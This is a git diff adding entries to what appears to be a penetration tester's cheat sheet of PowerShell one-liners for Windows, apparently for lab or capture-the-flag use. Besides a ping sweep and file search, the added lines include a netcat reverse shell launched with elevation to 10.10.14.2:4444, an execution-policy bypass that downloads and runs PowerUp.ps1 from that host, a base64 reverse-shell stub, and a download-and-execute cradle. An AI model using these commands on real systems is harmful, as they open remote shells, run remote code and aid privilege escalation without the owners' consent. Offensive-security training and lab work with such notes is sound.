@@ -23,13 +23,45 @@ Get-ADGroupMember -Identity "Domain Users" | Get-ADUser -Properties samaccountna
 
 ## Windows oneliners
 
+### Ping network
+
+```powershell
+1..254 | ForEach-Object { $ip = "192.168.110.$_"; if (Test-Connection -ComputerName $ip -Count 1 -Quiet) { Write-Host "IP: $ip is Up" } }
+```
+
+### Search file
 
 ```powershell
 Get-ChildItem -Path C:\ -Filter "file.ext" -Recurse -ErrorAction SilentlyContinue
 ```
 
-## Change Password of Administrator
+### Change Password of Administrator
 
 ```powershell
 Set-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString -AsPlainText "Password" -Force)
+```
+
+### Start Process
+
+```powershell
+Start-Process powershell -Verb runAs "\\10.10.14.2\share\nc.exe -e powershell 10.10.14.2 4444"
+```
+
+### Powershell bypass
+
+```powershell
+powershell.exe -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.2/PowerUp.ps1'); Invoke-AllChecks”
+```
+
+### Shell base64
+
+```powershell
+# https://www.revshells.com/ -> Powershell #3 (Base64)
+powershell.exe -e <base64 here>
+```
+
+### Import Powershell HTTP
+
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.2:80/script.ps1')
 ```
